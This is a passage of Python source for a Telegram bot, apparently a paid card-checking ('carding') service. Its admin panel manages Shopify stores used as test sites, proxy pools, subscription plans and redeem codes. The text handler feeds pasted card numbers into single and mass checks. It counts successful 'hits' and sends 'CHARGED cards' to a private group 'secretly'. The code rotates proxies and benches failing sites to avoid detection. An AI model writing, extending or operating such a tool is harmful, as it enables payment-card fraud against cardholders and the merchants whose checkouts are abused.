
@router.callback_query(F.data == "admin:add_site")
async def cb_admin_add_site(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_add_site")
    await cb.message.edit_text(
        f"{pe('add')} <b>{sc('Add Site')}</b>\n<blockquote>"
        f"{sc('Send URL')} (e.g. <code>store.myshopify.com</code>)\n"
        f"{pe('check')} {sc('Will be tested via active API before adding')}</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", callback_data="admin:sites")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:health_refresh")
async def cb_admin_health(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    await cb.answer("Pinging...")
    try:
        health = {}
        sites = get_sites()
        if sites:
            async with aiohttp.ClientSession() as sess:
                for site in sites:
                    health[site] = "ok" if await _check_site_ok(sess, site) else "down"
            async with _get_write_lock():
                set_setting("site_health", json.dumps(health))
            for s, st in health.items():
                if st == "ok":
                    _site_cooldown_until.pop(s, None)
                    _site_fail_count[s] = 0
    except Exception as e:
        return await cb.answer(f"Err: {e}", show_alert=True)
    await cb_admin_sites(cb)

@router.callback_query(F.data.startswith("admin:site_view:"))
async def cb_admin_site_view(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try:
        idx = int(cb.data.split(":")[2])
        sites = get_sites()
        if idx >= len(sites): return await cb.answer("Site removed", show_alert=True)
        site = sites[idx]
        fails = _site_fail_count.get(site, 0)
        try: health = json.loads(get_setting("site_health", "{}") or "{}").get(site, "unknown")
        except Exception: health = "unknown"
        benched = _is_site_benched(site)
        left = max(0, int(_site_cooldown_until.get(site, 0) - time.time()))
        text = (f"{pe('shop')} <b>{sc('Site')} #{idx+1}</b>\n<blockquote>"
                f"<code>{site}</code>\n{sc('Health')}: <b>{health.upper()}</b>\n"
                f"{sc('Fails')}: <b>{fails}</b>\n"
                f"{sc('Benched')}: <b>{'YES' if benched else 'NO'}</b>"
                + (f"\n{sc('Cooldown')}: <b>{left}s</b>" if benched else "") + f"</blockquote>")
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [pbtn(sc("Reset"), icon="refresh", color="success", callback_data=f"admin:reset_fails:{idx}")],
            [pbtn(sc("Remove Site"), icon="trash", color="danger", callback_data=f"admin:remove_site:{idx}")],
            [pbtn(sc("Back"), icon="back", callback_data="admin:sites")],
        ])
        await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:remove_site:"))
async def cb_admin_remove_site(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try:
        idx = int(cb.data.split(":")[2])
        sites = get_sites()
        if idx < len(sites): remove_site(sites[idx])
        await cb.answer("Site removed", show_alert=True)
        await cb_admin_sites(cb)
    except Exception: await cb.answer("Err", show_alert=True)

@router.callback_query(F.data.startswith("admin:reset_fails:"))
async def cb_admin_reset(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try:
        idx = int(cb.data.split(":")[2])
        sites = get_sites()
        if idx < len(sites):
            s = sites[idx]
            _site_fail_count[s] = 0
            _site_cooldown_until.pop(s, None)
        await cb.answer("Reset")
        await cb_admin_sites(cb)
    except Exception: await cb.answer("Err")

@router.callback_query(F.data == "admin:toggle_maint")
async def cb_admin_toggle_maint(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    new = "1" if get_setting("maintenance") == "0" else "0"
    set_setting("maintenance", new)
    try:
        await cb.message.edit_text(f"{pe('settings')} <b>{sc('Admin Panel')}</b>",
                                   parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
    except Exception: pass
    await cb.answer(f"Maint: {'ON' if new=='1' else 'OFF'}")

# ─── three channel settings ─────────────────────────────────────────────────
@router.callback_query(F.data == "admin:set_public_channel")
async def cb_admin_set_public_channel(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "set_public_channel")
    await cb.message.edit_text(
        f"{pe('chat')} <b>{sc('Public Channel')}</b>\n"
        f"<blockquote>{sc('Send channel username or URL')}\n"
        f"{sc('Example')}: <code>@yourchannel</code> {sc('or')} <code>https://t.me/yourchannel</code>\n\n"
        f"{sc('Send')} <code>off</code> {sc('to disable')}</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:set_autopost")
async def cb_admin_set_autopost(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "set_autopost")
    await cb.message.edit_text(
        f"{pe('chat2')} <b>{sc('Public Log GC')}</b>\n"
        f"<blockquote>{sc('Send chat ID or @username for public hits')}\n"
        f"{sc('Send')} <code>off</code> {sc('to disable')}</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:set_hitlog")
async def cb_admin_set_hitlog(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "set_hitlog")
    await cb.message.edit_text(
        f"{pe('unlock')} <b>{sc('Private GC')}</b>\n"
        f"<blockquote>{sc('Send chat ID or @username where CHARGED cards go secretly')}\n"
        f"{sc('Send')} <code>off</code> {sc('to disable')}</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

# ─── branding editor ────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:branding")
async def cb_admin_branding(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    b = get_branding()
    text = (f"{pe('pen')} <b>{sc('Edit Branding')}</b>\n<blockquote>"
            f"{pe('chat')} Bot: <b>{esc(b['bot_name'])}</b>\n"
            f"{pe('user')} Dev: <b>{esc(b['dev_name'])}</b>\n"
            f"{pe('link')} Dev User: <b>{esc(b['dev_username'])}</b>\n"
            f"{pe('chat2')} Network: <b>{esc(b['network_name'])}</b>\n"
            f"{pe('link')} Network User: <b>{esc(b['network_username'])}</b></blockquote>\n"
            f"<i>{sc('Tap a field to edit')}</i>")
    try: await cb.message.edit_text(text, parse_mode="HTML", reply_markup=branding_kb())
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:brand_edit:"))
async def cb_admin_brand_edit(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    field = cb.data.split(":", 2)[2]
    set_awaiting(cb.from_user.id, f"brand_{field}")
    await cb.message.edit_text(
        f"{pe('pen')} <b>{sc('Edit')} {field.replace('_', ' ').title()}</b>\n"
        f"<blockquote>{sc('Send new value')}</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Cancel"), icon="back", callback_data="admin:branding")]]))
    await cb.answer()

# ─── admin management ───────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:manage_admins")
async def cb_admin_manage_admins(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    admins = list_extra_admins()
    text = (f"{pe('user')} <b>{sc('Extra Admins')} ({len(admins)})</b>\n"
            f"<blockquote>{sc('Can use')}: /genkey · /broadcast · view users/recent/top/stats</blockquote>")
    try: await cb.message.edit_text(text, parse_mode="HTML", reply_markup=admins_kb())
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data == "admin:add_admin")
async def cb_admin_add_admin(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "add_admin")
    await cb.message.edit_text(
        f"{pe('add')} <b>{sc('Add Extra Admin')}</b>\n"
        f"<blockquote>{sc('Send user ID or forward a message from them')}\n"
        f"{pe('warn')} {sc('They will get')}: /genkey · /broadcast</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Cancel"), icon="back", callback_data="admin:manage_admins")]]))
    await cb.answer()

@router.callback_query(F.data.startswith("admin:view_admin:"))
async def cb_admin_view_admin(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try:
        target = int(cb.data.split(":")[2])
        with db() as c:
            a = c.execute("SELECT * FROM extra_admins WHERE uid=?", (target,)).fetchone()
        if not a: return await cb.answer("Not found", show_alert=True)
        text = (f"{pe('user')} <b>{sc('Extra Admin')}</b>\n<blockquote>"
                f"UID: <code>{target}</code>\n"
                f"@{esc(a['username'] or 'N/A')}\n"
                f"{sc('Added')}: {a['added_at'][:10]}</blockquote>")
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [pbtn(sc("Remove Admin"), icon="trash", color="danger",
                  callback_data=f"admin:remove_admin:{target}")],
            [pbtn(sc("Back"), icon="back", callback_data="admin:manage_admins")],
        ])
        await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:remove_admin:"))
async def cb_admin_remove_admin(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try:
        target = int(cb.data.split(":")[2])
        remove_extra_admin(target)
        await cb.answer("Removed", show_alert=True)
        await cb_admin_manage_admins(cb)
    except Exception: await cb.answer("Err")

# ─── plan settings ──────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:plan_settings")
async def cb_admin_plan_settings(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    text = (f"{pe('settings')} <b>{sc('Plan Settings')}</b>\n"
            f"<blockquote>{sc('Live edits apply instantly')}</blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Beginner", icon="user", callback_data="admin:plan_edit:free")],
        [pbtn("Pro", icon="gem", callback_data="admin:plan_edit:pro")],
        [pbtn("Premium", icon="gem2", callback_data="admin:plan_edit:premium")],
        [pbtn("MAX", icon="gem3", callback_data="admin:plan_edit:max")],
        [pbtn("Unlimited", icon="infinity", callback_data="admin:plan_edit:unlimited")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:main")],
    ])
    try: await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:plan_edit:"))
async def cb_admin_plan_edit(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    plan_key = cb.data.split(":")[2]
    p = PLANS.get(plan_key, {})
    if not p: return await cb.answer("Invalid plan")
    text = (f"{pe('settings')} <b>{sc('Edit Plan')}: {plan_key.upper()}</b>\n<blockquote>"
            f"{pe('chart')} {sc('Daily Limit')}: <b>{p.get('limit')}</b>\n"
            f"{pe('shop')} {sc('Batch Limit')}: <b>{p.get('mass_limit')}</b>\n"
            f"{pe('star')} {sc('Price (Stars)')}: <b>{p.get('stars')}</b></blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Edit Daily Limit"), icon="chart", color="success", callback_data=f"admin:plan_set:{plan_key}:limit")],
        [pbtn(sc("Edit Batch Limit"), icon="shop", color="success", callback_data=f"admin:plan_set:{plan_key}:mass_limit")],
        [pbtn(sc("Edit Stars Price"), icon="star", color="success", callback_data=f"admin:plan_set:{plan_key}:stars")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:plan_settings")],
    ])
    try: await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:plan_set:"))
async def cb_admin_plan_set(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    parts = cb.data.split(":")
    plan_key, field = parts[2], parts[3]
    set_awaiting(cb.from_user.id, f"plan_set_{plan_key}_{field}")
    await cb.message.edit_text(
        f"{pe('pen')} <b>{sc('Edit')} {field.replace('_', ' ').title()}</b>\n"
        f"<blockquote>{sc('New value for')} <b>{plan_key.upper()}</b> ({field}):</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Cancel"), icon="back", callback_data=f"admin:plan_edit:{plan_key}")]]))
    await cb.answer()

# ─── upload db ──────────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:upload_db")
async def cb_admin_upload_db(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "upload_db")
    await cb.message.edit_text(
        f"{pe('docs')} <b>{sc('Upload Database')}</b>\n\n"
        f"<blockquote>{sc('Send')} <code>.db</code> {sc('file')}.\n\n"
        f"{pe('warn')} <b>{sc('Warning')}:</b> {sc('Will backup current DB and replace. Bot restarts')}.</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Cancel"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

# ─── other admin panel buttons ──────────────────────────────────────────────
@router.callback_query(F.data == "admin:gen_code")
async def cb_admin_gen_code(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_gen_code")
    await cb.message.edit_text(
        f"{pe('gem')} <b>{sc('Generate Redeem Code')}</b>\n<code>[plan] [uses] [days]</code>",
        parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data == "admin:user_lookup")
async def cb_admin_ul(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_user_lookup")
    await cb.message.edit_text(f"{pe('user')} <b>{sc('User ID')}:</b>", parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data == "admin:give_plan")
async def cb_admin_gp(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_give_plan")
    await cb.message.edit_text(f"{pe('gem')} <code>[uid] [plan]</code>", parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data == "admin:give_points")
async def cb_admin_gpts(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_give_points")
    await cb.message.edit_text(f"{pe('star')} <code>[uid] [amount]</code>", parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data == "admin:ban")
async def cb_admin_ban(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_ban")
    await cb.message.edit_text(f"{pe('warn')} <code>[uid]</code>", parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data == "admin:broadcast")
async def cb_admin_bc(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_broadcast")
    await cb.message.edit_text(f"{pe('bell')} <b>{sc('Broadcast')}</b>\n"
                               f"<blockquote>{sc('Send the message to broadcast')}</blockquote>",
                               parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    with db() as c:
        tu = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
        today = datetime.now(timezone.utc).date().isoformat()
        nt = c.execute("SELECT COUNT(*) as n FROM users WHERE last_seen LIKE ?", (f"{today}%",)).fetchone()["n"]
        tc = c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"]
        th = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status='HIT'").fetchone()["n"]
        bn = c.execute("SELECT COUNT(*) as n FROM users WHERE banned=1").fetchone()["n"]
    rate = (th / tc * 100) if tc else 0
    try: ok = sum(1 for v in json.loads(get_setting("site_health", "{}") or "{}").values() if v == "ok")
    except Exception: ok = 0
    sites = get_sites()
    text = (f"{pe('chart')} <b>{sc('Admin Stats')}</b>\n<blockquote>"
            f"{pe('user')} {sc('Users')}: <b>{tu:,}</b>\n"
            f"{pe('online')} {sc('Today')}: <b>{nt:,}</b>\n"
            f"{pe('shop')} {sc('Checks')}: <b>{tc:,}</b>\n"
            f"{pe('check')} {sc('Hits')}: <b>{th:,}</b>\n"
            f"{pe('percent')} {sc('Rate')}: <b>{rate:.1f}%</b>\n"
            f"{pe('warn')} {sc('Banned')}: <b>{bn:,}</b>\n"
            f"{pe('online')} {sc('Sites OK')}: <b>{ok}/{len(sites)}</b></blockquote>")
    try:
        await cb.message.edit_text(text, parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
    except Exception: pass
    await cb.answer()

# ══════════════════════════════════════════════════════════════════════════════
# TEXT HANDLER
# ══════════════════════════════════════════════════════════════════════════════
@router.message(F.text)
async def handle_text(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    awaiting = get_awaiting(uid)

    if awaiting == "add_proxy":
        set_awaiting(uid, '')
        parsed = parse_proxy_txt(msg.text)
        if not parsed:
            return await msg.answer(
                f"{pe('cross1')} <b>{sc('No valid proxies')}</b>\n"
                f"<blockquote>{pe('warn')} {sc('Only auth proxies accepted')}.\n"
                f"{sc('Format')}: <code>user:pass@host:port</code></blockquote>",
                parse_mode="HTML", reply_markup=proxy_kb(uid))
        st = await msg.answer(
            f"{pe('loading')} <b>{sc('Testing')} {len(parsed)} {sc('proxies')}...</b>\n"
            f"<blockquote>{sc('This may take a few seconds')}</blockquote>",
            parse_mode="HTML")
        try:
            live = 0
            with db() as c:
                existing = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (uid,)).fetchone()["n"]
            slots = LIVE_PROXY_LIMIT - existing
            if slots <= 0:
                return await st.edit_text(
                    f"{pe('warn')} <b>{sc('Limit Reached')}</b>",
                    parse_mode="HTML", reply_markup=proxy_kb(uid))
            added = 0
            for p in parsed:
                if added >= slots: break
                if not await _is_proxy_dead(p):
                    live += 1
                    with db() as c:
                        c.execute("INSERT OR IGNORE INTO user_proxies(uid, proxy, status, checked_at) VALUES (?, ?, 'live', ?)",
                                  (uid, p, datetime.now(timezone.utc).isoformat()))
                    _append_proxy_pool(p)
                    added += 1
            await st.edit_text(
                f"{pe('check')} <b>{sc('Proxy Add Complete')}</b>\n<blockquote>"
                f"{pe('add')} {sc('Parsed')}: <b>{len(parsed)}</b>\n"
                f"{pe('check')} {sc('Live kept')}: <b>{added}</b>\n"
                f"{pe('cross2')} {sc('Dead removed')}: <b>{len(parsed) - added}</b></blockquote>",
                parse_mode="HTML", reply_markup=proxy_kb(uid))
        except Exception as e:
            await st.edit_text(f"{pe('cross1')} <b>{sc('Error')}:</b> {esc(str(e))}", parse_mode="HTML")
        return

    if awaiting == "force_add" and is_owner(uid):
        set_awaiting(uid, '')
        fwd_chat = getattr(msg, "forward_from_chat", None)
        if not fwd_chat:
            return await msg.answer(
                f"{pe('cross1')} <b>{sc('Invalid')}</b>\n"
                f"<blockquote>{sc('Forward a message from the channel/group')}.</blockquote>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    pbtn(sc("Back"), icon="back", callback_data="admin:force_list")]]))
        try:
            chat_id = str(fwd_chat.id)
            title = fwd_chat.title or ""
            chat_type = fwd_chat.type or "channel"
            invite = ""
            try:
                chat = await msg.bot.get_chat(chat_id)
                if chat.invite_link: invite = chat.invite_link
                elif chat.username: invite = f"https://t.me/{chat.username}"
                else:
                    try: invite = (await msg.bot.create_chat_invite_link(chat_id)).invite_link
                    except Exception: pass
            except Exception: pass
            add_force_channel(chat_id, title, chat_type, invite)
            await msg.answer(
                f"{pe('check')} <b>{sc('Force Channel Added')}</b>\n<blockquote>"
                f"{pe('chat')} {esc(title)}\n"
                f"{pe('link')} <code>{esc(chat_id)}</code></blockquote>",
                parse_mode="HTML", reply_markup=force_list_kb())
        except Exception as e:
            await msg.answer(f"{pe('cross1')} <b>{sc('Failed')}:</b> {esc(str(e))}", parse_mode="HTML")
        return

    if awaiting and is_admin(uid):
        set_awaiting(uid, '')

        # Owner-only awaiting states
        owner_only = ("admin_give_plan", "admin_give_points", "admin_ban",
                      "plan_set_", "admin_add_site")
        if any(awaiting.startswith(x) if x.endswith("_") else awaiting == x for x in owner_only) and not is_owner(uid):
            return await msg.answer(f"{pe('cross1')} <b>{sc('Owner only')}</b>", parse_mode="HTML")

        try:
            if awaiting.startswith("brand_"):
                field = awaiting[6:]
                val = msg.text.strip()
                if val.startswith("@"): val = val
                set_setting(field, val)
                await msg.answer(
                    f"{pe('check')} <b>{sc('Updated')}!</b>\n"
                    f"<blockquote>{esc(field)} = <b>{esc(val)}</b></blockquote>",
                    parse_mode="HTML", reply_markup=branding_kb())
                return

            if awaiting == "set_public_channel":
                v = msg.text.strip()
                if v.lower() in ("off", "disable", "clear"):
                    set_setting("public_channel", "")
                    await msg.answer(f"{pe('check')} {sc('Public Channel disabled')}",
                                     parse_mode="HTML", reply_markup=admin_main_kb(uid))
                else:
                    set_setting("public_channel", v)
                    await msg.answer(f"{pe('check')} {sc('Public Channel set')}: <code>{esc(v)}</code>",
                                     parse_mode="HTML", reply_markup=admin_main_kb(uid))
                return

            if awaiting == "set_autopost":
                v = msg.text.strip()
                if v.lower() in ("off", "disable", "clear"):
                    set_setting("auto_post_chat", "")
                    await msg.answer(f"{pe('check')} {sc('Public Log GC disabled')}",
                                     parse_mode="HTML", reply_markup=admin_main_kb(uid))
                else:
                    set_setting("auto_post_chat", v)
                    await msg.answer(f"{pe('check')} {sc('Public Log GC set')}: <code>{esc(v)}</code>",
                                     parse_mode="HTML", reply_markup=admin_main_kb(uid))
                return

            if awaiting == "set_hitlog":
                v = msg.text.strip()
                if v.lower() in ("off", "disable", "clear"):
                    set_setting("hit_log_channel", "")
                    await msg.answer(f"{pe('check')} {sc('Private GC disabled')}",
                                     parse_mode="HTML", reply_markup=admin_main_kb(uid))
                else:
                    set_setting("hit_log_channel", v)
                    await msg.answer(f"{pe('check')} {sc('Private GC set')}: <code>{esc(v)}</code>",
                                     parse_mode="HTML", reply_markup=admin_main_kb(uid))
                return

            if awaiting == "add_admin":
                target_uid = None
                target_uname = ""
                fwd_user = getattr(msg, "forward_from", None)
                if fwd_user:
                    target_uid = fwd_user.id
                    target_uname = fwd_user.username or ""
                elif msg.text.strip().replace("@", "").isdigit():
                    target_uid = int(msg.text.strip().replace("@", ""))
                else:
                    return await msg.answer(f"{pe('cross1')} {sc('Invalid UID')}",
                                             parse_mode="HTML")
                if target_uid == PRIMARY_ADMIN_ID:
                    return await msg.answer(f"{pe('warn')} {sc('Already owner')}",
                                             parse_mode="HTML")
                add_extra_admin(target_uid, target_uname)
                await msg.answer(
                    f"{pe('check')} <b>{sc('Admin added')}</b>\n"
                    f"<blockquote>UID: <code>{target_uid}</code>\n"
                    f"{sc('Can use')}: /genkey · /broadcast</blockquote>",
                    parse_mode="HTML", reply_markup=admins_kb())
                return

            if awaiting.startswith("plan_set_"):
                parts = awaiting.split("_")
                plan_key, field = parts[2], parts[3]
                try:
                    val = int(msg.text.strip())
                    val = max(0, val) if field == "stars" else max(1, val)
                    PLANS[plan_key][field] = val
                    set_setting(f"plan_{plan_key}_{field}", str(val))
                    await msg.answer(
                        f"{pe('check')} <b>{sc('Updated')}!</b>\n"
                        f"<blockquote>{plan_key.upper()} {field} = <b>{val}</b></blockquote>",
                        parse_mode="HTML", reply_markup=admin_main_kb(uid))
                except ValueError:
                    await msg.answer(f"{pe('cross1')} <b>{sc('Invalid number')}</b>",
                                     parse_mode="HTML", reply_markup=admin_main_kb(uid))
                return

            if awaiting == "admin_add_site":
                raw = msg.text.strip()
                await _addsite_flow(msg, raw)
                return

            if awaiting == "admin_gen_code":
                parts = msg.text.split()
                if (len(parts) == 3 and parts[0].lower() in PLANS
                        and parts[1].isdigit() and parts[2].isdigit()):
                    plan = parts[0].lower(); uses = int(parts[1]); days = int(parts[2])
                    if uses <= 0 or days <= 0:
                        return await msg.answer(f"{pe('cross1')} {sc('invalid')}", reply_markup=admin_main_kb(uid))
                    code = "OGGY-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
                    with db() as c:
                        c.execute("INSERT INTO redeem_codes (code, plan, max_uses, days, used) VALUES (?,?,?,?,0)",
                                  (code, plan, uses, days))
                    await msg.answer(
                        f"{pe('gem')} <b>{sc('Code')}</b>\n<blockquote>"
                        f"{pe('star')} <code>{code}</code>\n"
                        f"{pe('gem')} {PLANS[plan]['name']}\n"
                        f"{pe('user')} {sc('Uses')}: <b>{uses}</b>\n"
                        f"{pe('hourglass')} {sc('Days')}: <b>{days}</b></blockquote>",
                        parse_mode="HTML", reply_markup=admin_main_kb(uid))
                else:
                    await msg.answer(f"{pe('cross1')} {sc('invalid')}", reply_markup=admin_main_kb(uid))
                return

            if awaiting == "admin_give_plan":
                parts = msg.text.split()
                if len(parts) == 2 and parts[0].isdigit() and parts[1].lower() in PLANS:
                    upgrade_user(int(parts[0]), parts[1].lower())
                    await msg.answer(f"{pe('check')} {sc('Done')}", reply_markup=admin_main_kb(uid))
                else:
                    await msg.answer(f"{pe('cross1')} {sc('invalid')}", reply_markup=admin_main_kb(uid))
                return

            if awaiting == "admin_give_points":
                parts = msg.text.split()
                if len(parts) == 2 and parts[0].isdigit() and parts[1].lstrip('-').isdigit():
                    ensure_user(int(parts[0]))
                    with db() as c:
                        c.execute("UPDATE users SET credits=MAX(0, credits+?) WHERE uid=?",
                                  (int(parts[1]), int(parts[0])))
                    await msg.answer(f"{pe('check')} {sc('Done')}", reply_markup=admin_main_kb(uid))
                else:
                    await msg.answer(f"{pe('cross1')} {sc('invalid')}", reply_markup=admin_main_kb(uid))
                return

            if awaiting == "admin_ban":
                if msg.text.strip().isdigit():
                    t = int(msg.text.strip())
                    ensure_user(t)
                    with db() as c:
                        u = c.execute("SELECT banned FROM users WHERE uid=?", (t,)).fetchone()
                        nv = 0 if (u and u["banned"]) else 1
                        c.execute("UPDATE users SET banned=? WHERE uid=?", (nv, t))
                    await msg.answer(f"{pe('check')} {'Unban' if nv==0 else 'Banned'}",
                                     reply_markup=admin_main_kb(uid))
                return

            if awaiting == "admin_user_lookup":
                if msg.text.strip().isdigit():
                    t = int(msg.text.strip())
                    u = get_user(t)
                    if not u:
                        await msg.answer(f"{pe('cross1')} {sc('Not found')}", reply_markup=admin_main_kb(uid))
                    else:
                        await msg.answer(
                            f"{pe('user')} <b>{t}</b>\n<blockquote>"
                            f"@{esc(u['username'] or 'N/A')}\n"
                            f"{sc('Plan')}: {u['plan']}\n"
                            f"{sc('Credits')}: {u['credits']}\n"
                            f"{sc('Checks')}: {u['total_checks']}\n"
                            f"{sc('Hits')}: {u['total_hits']}\n"
                            f"{sc('Refs')}: {u['refer_count']}\n"
                            f"{sc('Banned')}: {'YES' if u['banned'] else 'NO'}</blockquote>",
                            parse_mode="HTML", reply_markup=admin_main_kb(uid))
                return

            if awaiting == "admin_broadcast":
                with db() as c:
                    users = c.execute("SELECT uid FROM users WHERE banned=0").fetchall()
                ok = 0
                for u in users:
                    try:
                        await msg.bot.send_message(u["uid"], msg.html_text, parse_mode="HTML")
                        ok += 1
                        await asyncio.sleep(0.05)
                    except Exception: pass
                await msg.answer(f"{pe('check')} {sc('Sent')} {ok}/{len(users)}",
                                 reply_markup=admin_main_kb(uid))
                return
        except Exception as e:
            log.exception(f"admin: {e}")
        return

    if not await check_force_sub(msg.bot, uid):
        return await msg.answer(f"{pe('unlock')} <b>{sc('Join required channels first')}</b>", parse_mode="HTML")
    if get_setting("maintenance") == "1" and not is_admin(uid):
        return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")

    stripped = msg.text.strip()
    n = normalize_cc(stripped)
    if n: return await process_check_logic(msg, n, msg.bot)
    if "\n" in msg.text:
        return await run_mass_check(msg, msg.text.split("\n"), msg.bot, bypass_quota=is_admin(uid))

# ══════════════════════════════════════════════════════════════════════════════
# PROXY TXT
# ══════════════════════════════════════════════════════════════════════════════
@router.message(F.document)
async def handle_proxy_txt_upload(msg: Message):
    uid = msg.from_user.id
    awaiting = get_awaiting(uid)
    if awaiting != "add_proxy": return
    doc = msg.document
    if not (doc.file_name or "").lower().endswith(".txt"):
        return await msg.answer(
            f"{pe('cross1')} <b>{sc('Only .txt files accepted')}</b>", parse_mode="HTML",
            reply_markup=proxy_kb(uid))
    if (doc.file_size or 0) > 5 * 1024 * 1024:
        return await msg.answer(f"{pe('cross1')} <b>{sc('File too large')}</b> (max 5 MB)", parse_mode="HTML")
    set_awaiting(uid, '')
    st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')} .txt...</b>", parse_mode="HTML")
    try:
        f = await msg.bot.get_file(doc.file_id)
        buf = await msg.bot.download_file(f.file_path)
        raw = buf.read().decode("utf-8", errors="ignore")
    except Exception as e:
        return await st.edit_text(f"{pe('cross1')} <b>{sc('Download failed')}:</b> {esc(str(e))}",
                                   parse_mode="HTML", reply_markup=proxy_kb(uid))
    parsed = parse_proxy_txt(raw)
    if not parsed:
        return await st.edit_text(
            f"{pe('cross1')} <b>{sc('No valid proxies in file')}</b>",
            parse_mode="HTML", reply_markup=proxy_kb(uid))
    await st.edit_text(
        f"{pe('loading')} <b>{sc('Testing')} {len(parsed)} {sc('proxies')}...</b>",
        parse_mode="HTML")
    try:
        with db() as c:
            existing = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (uid,)).fetchone()["n"]
        slots = LIVE_PROXY_LIMIT - existing
        added = 0
        for p in parsed:
            if added >= slots: break
            if not await _is_proxy_dead(p):
                with db() as c:
                    c.execute("INSERT OR IGNORE INTO user_proxies(uid, proxy, status, checked_at) VALUES (?, ?, 'live', ?)",
                              (uid, p, datetime.now(timezone.utc).isoformat()))
                _append_proxy_pool(p)
                added += 1
        await st.edit_text(
            f"{pe('check')} <b>{sc('Proxy Add Complete')}</b>\n<blockquote>"
